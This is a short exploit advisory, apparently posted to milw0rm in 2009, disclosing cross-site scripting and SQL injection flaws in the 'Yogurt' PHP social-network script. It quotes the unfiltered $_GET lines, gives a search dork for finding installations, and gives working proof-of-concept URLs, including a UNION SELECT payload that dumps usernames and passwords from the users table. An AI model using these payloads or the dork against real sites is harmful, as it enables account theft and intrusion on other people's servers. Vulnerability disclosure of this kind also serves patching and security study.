@@ -1,0 +1,56 @@
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+  Name : Yogurt
+  Site    : http://sourceforge.net/projects/yogurt/
+  Down : http://sourceforge.net/project/showfiles.php?group_id=112452&package_id=141123&release_id=297459
+  Dork  : "Yogurt build"
+ 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ 
+  Found By : br0ly
+  Made in  : Brasil
+  Contact  : br0ly[dot]Code[at]gmail[dot]com
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+  Description:
+
+  Bug : XSS
+ 
+  In index.php:
+
+  index.php:45:    if(isset($_GET['msg']))
+  index.php:48:        print("<center>". $_GET['msg'] . "</center>"); <-- XSS VUL
+
+  BUG : SQL INJECTION
+
+  system/writemessage.php:81: $rs = mysql_query("SELECT * FROM messages WHERE id=" . $_GET['original'], $db) <-- SQLi Vul
+  system/writemessage.php:82:                or bug("Database error, please try again");
+  system/writemessage.php:83:            $row = mysql_fetch_array($rs);
+
+ 
+     
+  In neither case was the method _GET filtered properly.
+  Others .phps also contains the failures I'm posting the first one I found .. ^^
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+  P0c:
+ 
+    XSS  :  http://localhost/xscripts/yogurt/index.php?msg=<script>alert('br0ly')</script>
+   
+    First: Go to: http://localhost/yogurt/newuser.php, after register, just login and you can explore the sqli.
+   
+    SQLi :
+    http://localhost/yogurt/system/writemessage.php?original=-1+union+select+1,concat_ws(0x3a,username,password),3,4,5,6,7,8+from+users--
+
+
+
+  OBS: need register_globals=on;
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# milw0rm.com [2009-06-11]
